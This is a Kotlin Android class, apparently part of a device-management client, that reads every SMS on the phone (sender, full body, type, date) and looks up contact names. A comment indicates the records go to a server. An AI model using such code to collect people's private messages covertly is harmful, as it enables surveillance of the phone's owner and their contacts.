package com.mdm.client.collectors

import android.content.Context
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import com.mdm.client.util.DateFormatter

class SmsCollector(private val context: Context) {

    companion object {
        private const val TAG = "MsgSync"
    }

    fun getMessages(): List<Map<String, Any>> {
        val messages = mutableListOf<Map<String, Any>>()
        return try {
            val cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.DATE
                ),
                null, null,
                "${Telephony.Sms.DATE} DESC"
            )
            cursor?.use {
                val addrIdx = it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
                val bodyIdx = it.getColumnIndexOrThrow(Telephony.Sms.BODY)
                val typeIdx = it.getColumnIndexOrThrow(Telephony.Sms.TYPE)
                val dateIdx = it.getColumnIndexOrThrow(Telephony.Sms.DATE)

                while (it.moveToNext()) {
                    val address = it.getString(addrIdx) ?: ""
                    val dateMs = it.getLong(dateIdx)
                    val type = when (it.getInt(typeIdx)) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX  -> "INBOX"
                        Telephony.Sms.MESSAGE_TYPE_SENT   -> "SENT"
                        Telephony.Sms.MESSAGE_TYPE_DRAFT  -> "DRAFT"
                        Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "OUTBOX"
                        else -> "OTHER"
                    }
                    messages.add(mapOf(
                        "address" to address,
                        "body" to (it.getString(bodyIdx) ?: ""),
                        "type" to type,
                        // CRITICAL: date must match server's strptime format
                        "date" to DateFormatter.format(dateMs),
                        "contactName" to resolveContact(address)
                    ))
                }
            }
            messages
        } catch (e: Exception) {
            Log.e(TAG, "Failed to read SMS: ${e.message}")
            messages
        }
    }

    private fun resolveContact(number: String): String {
        return try {
            val uri = android.net.Uri.withAppendedPath(
                ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                android.net.Uri.encode(number)
            )
            val cursor = context.contentResolver.query(
                uri, arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME),
                null, null, null
            )
            cursor?.use {
                if (it.moveToFirst()) it.getString(0) else number
            } ?: number
        } catch (_: Exception) { number }
    }
}
